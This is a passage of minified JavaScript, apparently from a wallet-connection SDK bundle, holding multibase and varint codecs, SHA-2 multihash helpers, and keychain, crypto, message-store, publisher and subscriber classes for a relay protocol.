    name: "base58flickr",
    prefix: "Z",
    alphabet: "123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"
});
var Wie = Object.freeze({
    __proto__: null,
    base58btc: Oie,
    base58flickr: Rie
});
const Mie = Hn({
    prefix: "m",
    name: "base64",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
    bitsPerChar: 6
})
  , Nie = Hn({
    prefix: "M",
    name: "base64pad",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
    bitsPerChar: 6
})
  , Die = Hn({
    prefix: "u",
    name: "base64url",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",
    bitsPerChar: 6
})
  , Fie = Hn({
    prefix: "U",
    name: "base64urlpad",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",
    bitsPerChar: 6
});
var Uie = Object.freeze({
    __proto__: null,
    base64: Mie,
    base64pad: Nie,
    base64url: Die,
    base64urlpad: Fie
});
const pD = Array.from("")
  , kie = pD.reduce( (r, e, t) => (r[t] = e,
r), [])
  , Lie = pD.reduce( (r, e, t) => (r[e.codePointAt(0)] = t,
r), []);
function $ie(r) {
    return r.reduce( (e, t) => (e += kie[t],
    e), "")
}
function zie(r) {
    const e = [];
    for (const t of r) {
        const o = Lie[t.codePointAt(0)];
        if (o === void 0)
            throw new Error(`Non-base256emoji character: ${t}`);
        e.push(o)
    }
    return new Uint8Array(e)
}
const jie = k1({
    prefix: "",
    name: "base256emoji",
    encode: $ie,
    decode: zie
});
var qie = Object.freeze({
    __proto__: null,
    base256emoji: jie
})
  , Vie = gD
  , B_ = 128
  , Hie = -128
  , Gie = Math.pow(2, 31);
function gD(r, e, t) {
    e = e || [],
    t = t || 0;
    for (var o = t; r >= Gie; )
        e[t++] = r & 255 | B_,
        r /= 128;
    for (; r & Hie; )
        e[t++] = r & 255 | B_,
        r >>>= 7;
    return e[t] = r | 0,
    gD.bytes = t - o + 1,
    e
}
var Kie = JE
  , Zie = 128
  , __ = 127;
function JE(r, o) {
    var t = 0, o = o || 0, i = 0, n = o, s, a = r.length;
    do {
        if (n >= a)
            throw JE.bytes = 0,
            new RangeError("Could not decode varint");
        s = r[n++],
        t += i < 28 ? (s & __) << i : (s & __) * Math.pow(2, i),
        i += 7
    } while (s >= Zie);
    return JE.bytes = n - o,
    t
}
var Yie = Math.pow(2, 7)
  , Xie = Math.pow(2, 14)
  , Jie = Math.pow(2, 21)
  , Qie = Math.pow(2, 28)
  , ese = Math.pow(2, 35)
  , tse = Math.pow(2, 42)
  , rse = Math.pow(2, 49)
  , nse = Math.pow(2, 56)
  , ose = Math.pow(2, 63)
  , ise = function(r) {
    return r < Yie ? 1 : r < Xie ? 2 : r < Jie ? 3 : r < Qie ? 4 : r < ese ? 5 : r < tse ? 6 : r < rse ? 7 : r < nse ? 8 : r < ose ? 9 : 10
}
  , sse = {
    encode: Vie,
    decode: Kie,
    encodingLength: ise
}
  , yD = sse;
const I_ = (r, e, t=0) => (yD.encode(r, e, t),
e)
  , O_ = r => yD.encodingLength(r)
  , QE = (r, e) => {
    const t = e.byteLength
      , o = O_(r)
      , i = o + O_(t)
      , n = new Uint8Array(i + t);
    return I_(r, n, 0),
    I_(t, n, o),
    n.set(e, i),
    new ase(r,t,e,n)
}
;
class ase {
    constructor(e, t, o, i) {
        this.code = e,
        this.size = t,
        this.digest = o,
        this.bytes = i
    }
}
const bD = ({name: r, code: e, encode: t}) => new cse(r,e,t);
class cse {
    constructor(e, t, o) {
        this.name = e,
        this.code = t,
        this.encode = o
    }
    digest(e) {
        if (e instanceof Uint8Array) {
            const t = this.encode(e);
            return t instanceof Uint8Array ? QE(this.code, t) : t.then(o => QE(this.code, o))
        } else
            throw Error("Unknown type, must be binary type")
    }
}
const mD = r => async e => new Uint8Array(await crypto.subtle.digest(r, e))
  , lse = bD({
    name: "sha2-256",
    code: 18,
    encode: mD("SHA-256")
})
  , use = bD({
    name: "sha2-512",
    code: 19,
    encode: mD("SHA-512")
});
var fse = Object.freeze({
    __proto__: null,
    sha256: lse,
    sha512: use
});
const xD = 0
  , dse = "identity"
  , wD = dD
  , hse = r => QE(xD, wD(r))
  , pse = {
    code: xD,
    name: dse,
    encode: wD,
    digest: hse
};
var gse = Object.freeze({
    __proto__: null,
    identity: pse
});
new TextEncoder,
new TextDecoder;
const R_ = {
    ...cie,
    ...uie,
    ...die,
    ...pie,
    ...bie,
    ...Sie,
    ...Iie,
    ...Wie,
    ...Uie,
    ...qie
};
({
    ...fse,
    ...gse
});
function yse(r=0) {
    return globalThis.Buffer != null && globalThis.Buffer.allocUnsafe != null ? globalThis.Buffer.allocUnsafe(r) : new Uint8Array(r)
}
function vD(r, e, t, o) {
    return {
        name: r,
        prefix: e,
        encoder: {
            name: r,
            prefix: e,
            encode: t
        },
        decoder: {
            decode: o
        }
    }
}
const W_ = vD("utf8", "u", r => "u" + new TextDecoder("utf8").decode(r), r => new TextEncoder().encode(r.substring(1)))
  , E2 = vD("ascii", "a", r => {
    let e = "a";
    for (let t = 0; t < r.length; t++)
        e += String.fromCharCode(r[t]);
    return e
}
, r => {
    r = r.substring(1);
    const e = yse(r.length);
    for (let t = 0; t < r.length; t++)
        e[t] = r.charCodeAt(t);
    return e
}
)
  , bse = {
    utf8: W_,
    "utf-8": W_,
    hex: R_.base16,
    latin1: E2,
    ascii: E2,
    binary: E2,
    ...R_
};
function mse(r, e="utf8") {
    const t = bse[e];
    if (!t)
        throw new Error(`Unsupported encoding "${e}"`);
    return (e === "utf8" || e === "utf-8") && globalThis.Buffer != null && globalThis.Buffer.from != null ? globalThis.Buffer.from(r, "utf8") : t.decoder.decode(`${t.prefix}${r}`)
}
var xse = Object.defineProperty
  , wse = (r, e, t) => e in r ? xse(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , Bs = (r, e, t) => wse(r, typeof e != "symbol" ? e + "" : e, t);
class vse {
    constructor(e, t) {
        this.core = e,
        this.logger = t,
        Bs(this, "keychain", new Map),
        Bs(this, "name", voe),
        Bs(this, "version", Toe),
        Bs(this, "initialized", !1),
        Bs(this, "storagePrefix", Zs),
        Bs(this, "init", async () => {
            if (!this.initialized) {
                const o = await this.getKeyChain();
                typeof o < "u" && (this.keychain = o),
                this.initialized = !0
            }
        }
        ),
        Bs(this, "has", o => (this.isInitialized(),
        this.keychain.has(o))),
        Bs(this, "set", async (o, i) => {
            this.isInitialized(),
            this.keychain.set(o, i),
            await this.persist()
        }
        ),
        Bs(this, "get", o => {
            this.isInitialized();
            const i = this.keychain.get(o);
            if (typeof i > "u") {
                const {message: n} = Xe("NO_MATCHING_KEY", `${this.name}: ${o}`);
                throw new Error(n)
            }
            return i
        }
        ),
        Bs(this, "del", async o => {
            this.isInitialized(),
            this.keychain.delete(o),
            await this.persist()
        }
        ),
        this.core = e,
        this.logger = xo(t, this.name)
    }
    get context() {
        return zo(this.logger)
    }
    get storageKey() {
        return this.storagePrefix + this.version + this.core.customStoragePrefix + "//" + this.name
    }
    async setKeyChain(e) {
        await this.core.storage.setItem(this.storageKey, UE(e))
    }
    async getKeyChain() {
        const e = await this.core.storage.getItem(this.storageKey);
        return typeof e < "u" ? kE(e) : void 0
    }
    async persist() {
        await this.setKeyChain(this.keychain)
    }
    isInitialized() {
        if (!this.initialized) {
            const {message: e} = Xe("NOT_INITIALIZED", this.name);
            throw new Error(e)
        }
    }
}
var Tse = Object.defineProperty
  , Ese = (r, e, t) => e in r ? Tse(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , Fn = (r, e, t) => Ese(r, typeof e != "symbol" ? e + "" : e, t);
class Ase {
    constructor(e, t, o) {
        this.core = e,
        this.logger = t,
        Fn(this, "name", xoe),
        Fn(this, "keychain"),
        Fn(this, "randomSessionIdentifier", ZE()),
        Fn(this, "initialized", !1),
        Fn(this, "init", async () => {
            this.initialized || (await this.keychain.init(),
            this.initialized = !0)
        }
        ),
        Fn(this, "hasKeys", i => (this.isInitialized(),
        this.keychain.has(i))),
        Fn(this, "getClientId", async () => {
            this.isInitialized();
            const i = await this.getClientSeed()
              , n = lB(i);
            return XM(n.publicKey)
        }
        ),
        Fn(this, "generateKeyPair", () => {
            this.isInitialized();
            const i = $re();
            return this.setPrivateKey(i.publicKey, i.privateKey)
        }
        ),
        Fn(this, "signJWT", async i => {
            this.isInitialized();
            const n = await this.getClientSeed()
              , s = lB(n)
              , a = this.randomSessionIdentifier;
            return await XX(a, i, woe, s)
        }
        ),
        Fn(this, "generateSharedKey", (i, n, s) => {
            this.isInitialized();
            const a = this.getPrivateKey(i)
              , l = zre(a, n);
            return this.setSymKey(l, s)
        }
        ),
        Fn(this, "setSymKey", async (i, n) => {
            this.isInitialized();
            const s = n || Em(i);
            return await this.keychain.set(s, i),
            s
        }
        ),
        Fn(this, "deleteKeyPair", async i => {
            this.isInitialized(),
            await this.keychain.del(i)
        }
        ),
        Fn(this, "deleteSymKey", async i => {
            this.isInitialized(),
            await this.keychain.del(i)
        }
        ),
        Fn(this, "encode", async (i, n, s) => {
            this.isInitialized();
            const a = eD(s)
              , l = uu(n);
            if (s_(a))
                return Vre(l, s == null ? void 0 : s.encoding);
            if (i_(a)) {
                const b = a.senderPublicKey
                  , v = a.receiverPublicKey;
                i = await this.generateSharedKey(b, v)
            }
            const f = this.getSymKey(i)
              , {type: h, senderPublicKey: p} = a;
            return jre({
                type: h,
                symKey: f,
                message: l,
                senderPublicKey: p,
                encoding: s == null ? void 0 : s.encoding
            })
        }
        ),
        Fn(this, "decode", async (i, n, s) => {
            this.isInitialized();
            const a = Gre(n, s);
            if (s_(a)) {
                const l = Hre(n, s == null ? void 0 : s.encoding);
                return Ed(l)
            }
            if (i_(a)) {
                const l = a.receiverPublicKey
                  , f = a.senderPublicKey;
                i = await this.generateSharedKey(l, f)
            }
            try {
                const l = this.getSymKey(i)
                  , f = qre({
                    symKey: l,
                    encoded: n,
                    encoding: s == null ? void 0 : s.encoding
                });
                return Ed(f)
            } catch (l) {
                this.logger.error(`Failed to decode message from topic: '${i}', clientId: '${await this.getClientId()}'`),
                this.logger.error(l)
            }
        }
        ),
        Fn(this, "getPayloadType", (i, n=as) => {
            const s = Kp({
                encoded: i,
                encoding: n
            });
            return pu(s.type)
        }
        ),
        Fn(this, "getPayloadSenderPublicKey", (i, n=as) => {
            const s = Kp({
                encoded: i,
                encoding: n
            });
            return s.senderPublicKey ? Do(s.senderPublicKey, yo) : void 0
        }
        ),
        this.core = e,
        this.logger = xo(t, this.name),
        this.keychain = o || new vse(this.core,this.logger)
    }
    get context() {
        return zo(this.logger)
    }
    async setPrivateKey(e, t) {
        return await this.keychain.set(e, t),
        e
    }
    getPrivateKey(e) {
        return this.keychain.get(e)
    }
    async getClientSeed() {
        let e = "";
        try {
            e = this.keychain.get(P_)
        } catch {
            e = ZE(),
            await this.keychain.set(P_, e)
        }
        return mse(e, "base16")
    }
    getSymKey(e) {
        return this.keychain.get(e)
    }
    isInitialized() {
        if (!this.initialized) {
            const {message: e} = Xe("NOT_INITIALIZED", this.name);
            throw new Error(e)
        }
    }
}
var Pse = Object.defineProperty
  , Cse = Object.defineProperties
  , Sse = Object.getOwnPropertyDescriptors
  , M_ = Object.getOwnPropertySymbols
  , Bse = Object.prototype.hasOwnProperty
  , _se = Object.prototype.propertyIsEnumerable
  , eA = (r, e, t) => e in r ? Pse(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , Ise = (r, e) => {
    for (var t in e || (e = {}))
        Bse.call(e, t) && eA(r, t, e[t]);
    if (M_)
        for (var t of M_(e))
            _se.call(e, t) && eA(r, t, e[t]);
    return r
}
  , Ose = (r, e) => Cse(r, Sse(e))
  , Jo = (r, e, t) => eA(r, typeof e != "symbol" ? e + "" : e, t);
class Rse extends ZK {
    constructor(e, t) {
        super(e, t),
        this.logger = e,
        this.core = t,
        Jo(this, "messages", new Map),
        Jo(this, "messagesWithoutClientAck", new Map),
        Jo(this, "name", Eoe),
        Jo(this, "version", Aoe),
        Jo(this, "initialized", !1),
        Jo(this, "storagePrefix", Zs),
        Jo(this, "init", async () => {
            if (!this.initialized) {
                this.logger.trace("Initialized");
                try {
                    const o = await this.getRelayerMessages();
                    typeof o < "u" && (this.messages = o);
                    const i = await this.getRelayerMessagesWithoutClientAck();
                    typeof i < "u" && (this.messagesWithoutClientAck = i),
                    this.logger.debug(`Successfully Restored records for ${this.name}`),
                    this.logger.trace({
                        type: "method",
                        method: "restore",
                        size: this.messages.size
                    })
                } catch (o) {
                    this.logger.debug(`Failed to Restore records for ${this.name}`),
                    this.logger.error(o)
                } finally {
                    this.initialized = !0
                }
            }
        }
        ),
        Jo(this, "set", async (o, i, n) => {
            this.isInitialized();
            const s = js(i);
            let a = this.messages.get(o);
            if (typeof a > "u" && (a = {}),
            typeof a[s] < "u")
                return s;
            if (a[s] = i,
            this.messages.set(o, a),
            n === Am.inbound) {
                const l = this.messagesWithoutClientAck.get(o) || {};
                this.messagesWithoutClientAck.set(o, Ose(Ise({}, l), {
                    [s]: i
                }))
            }
            return await this.persist(),
            s
        }
        ),
        Jo(this, "get", o => {
            this.isInitialized();
            let i = this.messages.get(o);
            return typeof i > "u" && (i = {}),
            i
        }
        ),
        Jo(this, "getWithoutAck", o => {
            this.isInitialized();
            const i = {};
            for (const n of o) {
                const s = this.messagesWithoutClientAck.get(n) || {};
                i[n] = Object.values(s)
            }
            return i
        }
        ),
        Jo(this, "has", (o, i) => {
            this.isInitialized();
            const n = this.get(o)
              , s = js(i);
            return typeof n[s] < "u"
        }
        ),
        Jo(this, "ack", async (o, i) => {
            this.isInitialized();
            const n = this.messagesWithoutClientAck.get(o);
            if (typeof n > "u")
                return;
            const s = js(i);
            delete n[s],
            Object.keys(n).length === 0 ? this.messagesWithoutClientAck.delete(o) : this.messagesWithoutClientAck.set(o, n),
            await this.persist()
        }
        ),
        Jo(this, "del", async o => {
            this.isInitialized(),
            this.messages.delete(o),
            this.messagesWithoutClientAck.delete(o),
            await this.persist()
        }
        ),
        this.logger = xo(e, this.name),
        this.core = t
    }
    get context() {
        return zo(this.logger)
    }
    get storageKey() {
        return this.storagePrefix + this.version + this.core.customStoragePrefix + "//" + this.name
    }
    get storageKeyWithoutClientAck() {
        return this.storagePrefix + this.version + this.core.customStoragePrefix + "//" + this.name + "_withoutClientAck"
    }
    async setRelayerMessages(e) {
        await this.core.storage.setItem(this.storageKey, UE(e))
    }
    async setRelayerMessagesWithoutClientAck(e) {
        await this.core.storage.setItem(this.storageKeyWithoutClientAck, UE(e))
    }
    async getRelayerMessages() {
        const e = await this.core.storage.getItem(this.storageKey);
        return typeof e < "u" ? kE(e) : void 0
    }
    async getRelayerMessagesWithoutClientAck() {
        const e = await this.core.storage.getItem(this.storageKeyWithoutClientAck);
        return typeof e < "u" ? kE(e) : void 0
    }
    async persist() {
        await this.setRelayerMessages(this.messages),
        await this.setRelayerMessagesWithoutClientAck(this.messagesWithoutClientAck)
    }
    isInitialized() {
        if (!this.initialized) {
            const {message: e} = Xe("NOT_INITIALIZED", this.name);
            throw new Error(e)
        }
    }
}
var Wse = Object.defineProperty
  , Mse = Object.defineProperties
  , Nse = Object.getOwnPropertyDescriptors
  , N_ = Object.getOwnPropertySymbols
  , Dse = Object.prototype.hasOwnProperty
  , Fse = Object.prototype.propertyIsEnumerable
  , tA = (r, e, t) => e in r ? Wse(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , py = (r, e) => {
    for (var t in e || (e = {}))
        Dse.call(e, t) && tA(r, t, e[t]);
    if (N_)
        for (var t of N_(e))
            Fse.call(e, t) && tA(r, t, e[t]);
    return r
}
  , A2 = (r, e) => Mse(r, Nse(e))
  , Yi = (r, e, t) => tA(r, typeof e != "symbol" ? e + "" : e, t);
class Use extends YK {
    constructor(e, t) {
        super(e, t),
        this.relayer = e,
        this.logger = t,
        Yi(this, "events", new fs.EventEmitter),
        Yi(this, "name", Poe),
        Yi(this, "queue", new Map),
        Yi(this, "publishTimeout", Ze.toMiliseconds(Ze.ONE_MINUTE)),
        Yi(this, "initialPublishTimeout", Ze.toMiliseconds(Ze.ONE_SECOND * 15)),
        Yi(this, "needsTransportRestart", !1),
        Yi(this, "publish", async (o, i, n) => {
            var s;
            this.logger.debug("Publishing Payload"),
            this.logger.trace({
                type: "method",
                method: "publish",
                params: {
                    topic: o,
                    message: i,
                    opts: n
                }
            });
            const a = (n == null ? void 0 : n.ttl) || C_
              , l = i1(n)
              , f = (n == null ? void 0 : n.prompt) || !1
              , h = (n == null ? void 0 : n.tag) || 0
              , p = (n == null ? void 0 : n.id) || zl().toString()
              , b = {
                topic: o,
                message: i,
                opts: {
                    ttl: a,
                    relay: l,
                    prompt: f,
                    tag: h,
                    id: p,
                    attestation: n == null ? void 0 : n.attestation,
                    tvf: n == null ? void 0 : n.tvf
                }
            }
              , v = `Failed to publish payload, please try again. id:${p} tag:${h}`;
            try {
                const T = new Promise(async x => {
                    const E = ({id: P}) => {
                        b.opts.id === P && (this.removeRequestFromQueue(P),
                        this.relayer.events.removeListener(Bn.publish, E),
                        x(b))
                    }
                    ;
                    this.relayer.events.on(Bn.publish, E);
                    const B = $c(new Promise( (P, O) => {
                        this.rpcPublish({
                            topic: o,
                            message: i,
                            ttl: a,
                            prompt: f,
                            tag: h,
                            id: p,
                            attestation: n == null ? void 0 : n.attestation,
                            tvf: n == null ? void 0 : n.tvf
                        }).then(P).catch(F => {
                            this.logger.warn(F, F == null ? void 0 : F.message),
                            O(F)
                        }
                        )
                    }
                    ), this.initialPublishTimeout, `Failed initial publish, retrying.... id:${p} tag:${h}`);
                    try {
                        await B,
                        this.events.removeListener(Bn.publish, E)
                    } catch (P) {
                        this.queue.set(p, A2(py({}, b), {
                            attempt: 1
                        })),
                        this.logger.warn(P, P == null ? void 0 : P.message)
                    }
                }
                );
                this.logger.trace({
                    type: "method",
                    method: "publish",
                    params: {
                        id: p,
                        topic: o,
                        message: i,
                        opts: n
                    }
                }),
                await $c(T, this.publishTimeout, v)
            } catch (T) {
                if (this.logger.debug("Failed to Publish Payload"),
                this.logger.error(T),
                (s = n == null ? void 0 : n.internal) != null && s.throwOnFailedPublish)
                    throw T
            } finally {
                this.queue.delete(p)
            }
        }
        ),
        Yi(this, "on", (o, i) => {
            this.events.on(o, i)
        }
        ),
        Yi(this, "once", (o, i) => {
            this.events.once(o, i)
        }
        ),
        Yi(this, "off", (o, i) => {
            this.events.off(o, i)
        }
        ),
        Yi(this, "removeListener", (o, i) => {
            this.events.removeListener(o, i)
        }
        ),
        this.relayer = e,
        this.logger = xo(t, this.name),
        this.registerEventListeners()
    }
    get context() {
        return zo(this.logger)
    }
    async rpcPublish(e) {
        var t, o, i, n;
        const {topic: s, message: a, ttl: l=C_, prompt: f, tag: h, id: p, attestation: b, tvf: v} = e
          , T = {
            method: Sp(i1().protocol).publish,
            params: py({
                topic: s,
                message: a,
                ttl: l,
                prompt: f,
                tag: h,
                attestation: b
            }, v),
            id: p
        };
        zn((t = T.params) == null ? void 0 : t.prompt) && ((o = T.params) == null || delete o.prompt),
        zn((i = T.params) == null ? void 0 : i.tag) && ((n = T.params) == null || delete n.tag),
        this.logger.debug("Outgoing Relay Payload"),
        this.logger.trace({
            type: "message",
            direction: "outgoing",
            request: T
        });
        const x = await this.relayer.request(T);
        return this.relayer.events.emit(Bn.publish, e),
        this.logger.debug("Successfully Published Payload"),
        x
    }
    removeRequestFromQueue(e) {
        this.queue.delete(e)
    }
    checkQueue() {
        this.queue.forEach(async (e, t) => {
            const o = e.attempt + 1;
            this.queue.set(t, A2(py({}, e), {
                attempt: o
            }));
            const {topic: i, message: n, opts: s, attestation: a} = e;
            this.logger.warn({}, `Publisher: queue->publishing: ${e.opts.id}, tag: ${e.opts.tag}, attempt: ${o}`),
            await this.rpcPublish(A2(py({}, e), {
                topic: i,
                message: n,
                ttl: s.ttl,
                prompt: s.prompt,
                tag: s.tag,
                id: s.id,
                attestation: a,
                tvf: s.tvf
            })),
            this.logger.warn({}, `Publisher: queue->published: ${e.opts.id}`)
        }
        )
    }
    registerEventListeners() {
        this.relayer.core.heartbeat.on(Su.pulse, () => {
            if (this.needsTransportRestart) {
                this.needsTransportRestart = !1,
                this.relayer.events.emit(Bn.connection_stalled);
                return
            }
            this.checkQueue()
        }
        ),
        this.relayer.on(Bn.message_ack, e => {
            this.removeRequestFromQueue(e.id.toString())
        }
        )
    }
}
var kse = Object.defineProperty
  , Lse = (r, e, t) => e in r ? kse(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , wf = (r, e, t) => Lse(r, typeof e != "symbol" ? e + "" : e, t);
class $se {
    constructor() {
        wf(this, "map", new Map),
        wf(this, "set", (e, t) => {
            const o = this.get(e);
            this.exists(e, t) || this.map.set(e, [...o, t])
        }
        ),
        wf(this, "get", e => this.map.get(e) || []),
        wf(this, "exists", (e, t) => this.get(e).includes(t)),
        wf(this, "delete", (e, t) => {
            if (typeof t > "u") {
                this.map.delete(e);
                return
            }
            if (!this.map.has(e))
                return;
            const o = this.get(e);
            if (!this.exists(e, t))
                return;
            const i = o.filter(n => n !== t);
            if (!i.length) {
                this.map.delete(e);
                return
            }
            this.map.set(e, i)
        }
        ),
        wf(this, "clear", () => {
            this.map.clear()
        }
        )
    }
    get topics() {
        return Array.from(this.map.keys())
    }
}
var zse = Object.defineProperty
  , jse = Object.defineProperties
  , qse = Object.getOwnPropertyDescriptors
  , D_ = Object.getOwnPropertySymbols
  , Vse = Object.prototype.hasOwnProperty
  , Hse = Object.prototype.propertyIsEnumerable
  , rA = (r, e, t) => e in r ? zse(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , mp = (r, e) => {
    for (var t in e || (e = {}))
        Vse.call(e, t) && rA(r, t, e[t]);
    if (D_)
        for (var t of D_(e))
            Hse.call(e, t) && rA(r, t, e[t]);
    return r
}
  , P2 = (r, e) => jse(r, qse(e))
  , Wr = (r, e, t) => rA(r, typeof e != "symbol" ? e + "" : e, t);
class Gse extends QK {
    constructor(e, t) {
        super(e, t),
        this.relayer = e,
        this.logger = t,
        Wr(this, "subscriptions", new Map),
        Wr(this, "topicMap", new $se),
        Wr(this, "events", new fs.EventEmitter),
        Wr(this, "name", Roe),
        Wr(this, "version", Woe),
        Wr(this, "pending", new Map),
        Wr(this, "cached", []),
        Wr(this, "initialized", !1),
        Wr(this, "storagePrefix", Zs),
        Wr(this, "subscribeTimeout", Ze.toMiliseconds(Ze.ONE_MINUTE)),
        Wr(this, "initialSubscribeTimeout", Ze.toMiliseconds(Ze.ONE_SECOND * 15)),
        Wr(this, "clientId"),
        Wr(this, "batchSubscribeTopicsLimit", 500),
        Wr(this, "init", async () => {
            this.initialized || (this.logger.trace("Initialized"),
            this.registerEventListeners(),
            await this.restore()),
            this.initialized = !0
        }
        ),
        Wr(this, "subscribe", async (o, i) => {
            this.isInitialized(),
            this.logger.debug("Subscribing Topic"),
            this.logger.trace({
                type: "method",
                method: "subscribe",
                params: {
                    topic: o,
                    opts: i
                }
            });
            try {
                const n = i1(i)
                  , s = {
                    topic: o,
                    relay: n,
                    transportType: i == null ? void 0 : i.transportType
                };
                this.pending.set(o, s);
                const a = await this.rpcSubscribe(o, n, i);
                return typeof a == "string" && (this.onSubscribe(a, s),
                this.logger.debug("Successfully Subscribed Topic"),
                this.logger.trace({
                    type: "method",
                    method: "subscribe",
                    params: {
                        topic: o,
                        opts: i
                    }
                })),
                a
            } catch (n) {
                throw this.logger.debug("Failed to Subscribe Topic"),
                this.logger.error(n),
                n
            }
        }
        ),
        Wr(this, "unsubscribe", async (o, i) => {
            this.isInitialized(),
            typeof (i == null ? void 0 : i.id) < "u" ? await this.unsubscribeById(o, i.id, i) : await this.unsubscribeByTopic(o, i)
        }
        ),
        Wr(this, "isSubscribed", o => new Promise(i => {
            i(this.topicMap.topics.includes(o))
        }
        )),
        Wr(this, "isKnownTopic", o => new Promise(i => {
            i(this.topicMap.topics.includes(o) || this.pending.has(o) || this.cached.some(n => n.topic === o))
        }
        )),
        Wr(this, "on", (o, i) => {
            this.events.on(o, i)
        }
        ),
        Wr(this, "once", (o, i) => {
            this.events.once(o, i)
        }
        ),
        Wr(this, "off", (o, i) => {
            this.events.off(o, i)
        }
        ),
        Wr(this, "removeListener", (o, i) => {
            this.events.removeListener(o, i)
        }
        ),
        Wr(this, "start", async () => {
            await this.onConnect()
        }
        ),
        Wr(this, "stop", async () => {
            await this.onDisconnect()
        }
        ),
        Wr(this, "restart", async () => {
            await this.restore(),
            await this.onRestart()
        }
        ),
        Wr(this, "checkPending", async () => {
            if (this.pending.size === 0 && (!this.initialized || !this.relayer.connected))
                return;
            const o = [];
            this.pending.forEach(i => {
                o.push(i)
            }
            ),
            await this.batchSubscribe(o)
        }
        ),
        Wr(this, "registerEventListeners", () => {
            this.relayer.core.heartbeat.on(Su.pulse, async () => {
                await this.checkPending()
            }
            ),
            this.events.on(ti.created, async o => {
                const i = ti.created;
                this.logger.info(`Emitting ${i}`),
                this.logger.debug({
                    type: "event",
                    event: i,
                    data: o
                }),
                await this.persist()
            }
            ),
            this.events.on(ti.deleted, async o => {
                const i = ti.deleted;
                this.logger.info(`Emitting ${i}`),
                this.logger.debug({
                    type: "event",
                    event: i,
                    data: o
                }),
                await this.persist()
            }
            )
        }
        ),
        this.relayer = e,
        this.logger = xo(t, this.name),
        this.clientId = ""
    }
    get context() {
        return zo(this.logger)
    }
    get storageKey() {
        return this.storagePrefix + this.version + this.relayer.core.customStoragePrefix + "//" + this.name
    }
    get length() {
        return this.subscriptions.size
    }
    get ids() {
        return Array.from(this.subscriptions.keys())
    }
    get values() {
        return Array.from(this.subscriptions.values())
    }
    get topics() {
        return this.topicMap.topics
    }
    get hasAnyTopics() {
        return this.topicMap.topics.length > 0 || this.pending.size > 0 || this.cached.length > 0 || this.subscriptions.size > 0
    }
    hasSubscription(e, t) {
        let o = !1;
        try {
            o = this.getSubscription(e).topic === t
        } catch {}
        return o
    }
    reset() {
        this.cached = [],
        this.initialized = !0
    }
    onDisable() {
        this.values.length > 0 && (this.cached = this.values),
        this.subscriptions.clear(),
        this.topicMap.clear()
    }
    async unsubscribeByTopic(e, t) {
        const o = this.topicMap.get(e);
        await Promise.all(o.map(async i => await this.unsubscribeById(e, i, t)))
    }
    async unsubscribeById(e, t, o) {
        this.logger.debug("Unsubscribing Topic"),
        this.logger.trace({
            type: "method",
            method: "unsubscribe",
            params: {
                topic: e,
                id: t,
                opts: o
            }
        });
        try {
            const i = i1(o);
            await this.restartToComplete({
                topic: e,
                id: t,
                relay: i
            }),
            await this.rpcUnsubscribe(e, t, i);
            const n = Nr("USER_DISCONNECTED", `${this.name}, ${e}`);
            await this.onUnsubscribe(e, t, n),
            this.logger.debug("Successfully Unsubscribed Topic"),
            this.logger.trace({
                type: "method",
                method: "unsubscribe",
                params: {
                    topic: e,
                    id: t,
                    opts: o
                }
            })
        } catch (i) {
            throw this.logger.debug("Failed to Unsubscribe Topic"),
            this.logger.error(i),
            i
        }
    }
    async rpcSubscribe(e, t, o) {
        var i;
        (!o || (o == null ? void 0 : o.transportType) === kr.relay) && await this.restartToComplete({
            topic: e,
            id: e,
            relay: t
        });
        const n = {
            method: Sp(t.protocol).subscribe,
            params: {
                topic: e
            }
        };
        this.logger.debug("Outgoing Relay Payload"),
        this.logger.trace({
            type: "payload",
            direction: "outgoing",
            request: n
        });
        const s = (i = o == null ? void 0 : o.internal) == null ? void 0 : i.throwOnFailedPublish;
        try {
            const a = await this.getSubscriptionId(e);
            if ((o == null ? void 0 : o.transportType) === kr.link_mode)
                return setTimeout( () => {
                    (this.relayer.connected || this.relayer.connecting) && this.relayer.request(n).catch(h => this.logger.warn(h))
                }
                , Ze.toMiliseconds(Ze.ONE_SECOND)),
                a;
            const l = new Promise(async h => {
                const p = b => {
                    b.topic === e && (this.events.removeListener(ti.created, p),
                    h(b.id))
                }
                ;
                this.events.on(ti.created, p);
                try {
                    const b = await $c(new Promise( (v, T) => {
                        this.relayer.request(n).catch(x => {
                            this.logger.warn(x, x == null ? void 0 : x.message),
                            T(x)
                        }
                        ).then(v)
                    }
                    ), this.initialSubscribeTimeout, `Subscribing to ${e} failed, please try again`);
                    this.events.removeListener(ti.created, p),
                    h(b)
                } catch {}
            }
            )
              , f = await $c(l, this.subscribeTimeout, `Subscribing to ${e} failed, please try again`);
            if (!f && s)
                throw new Error(`Subscribing to ${e} failed, please try again`);
            return f ? a : null
        } catch (a) {
            if (this.logger.debug("Outgoing Relay Subscribe Payload stalled"),
            this.relayer.events.emit(Bn.connection_stalled),
            s)
                throw a
        }
        return null
    }
    async rpcBatchSubscribe(e) {
        if (!e.length)
            return;
        const t = e[0].relay
          , o = {
            method: Sp(t.protocol).batchSubscribe,
            params: {
                topics: e.map(i => i.topic)
            }
        };
        this.logger.debug("Outgoing Relay Payload"),
        this.logger.trace({
            type: "payload",
            direction: "outgoing",
            request: o
        });
        try {
            await await $c(new Promise(i => {
                this.relayer.request(o).catch(n => this.logger.warn(n)).then(i)
            }
            ), this.subscribeTimeout, "rpcBatchSubscribe failed, please try again")
        } catch {
            this.relayer.events.emit(Bn.connection_stalled)
        }
    }
    async rpcBatchFetchMessages(e) {
        if (!e.length)
            return;
        const t = e[0].relay
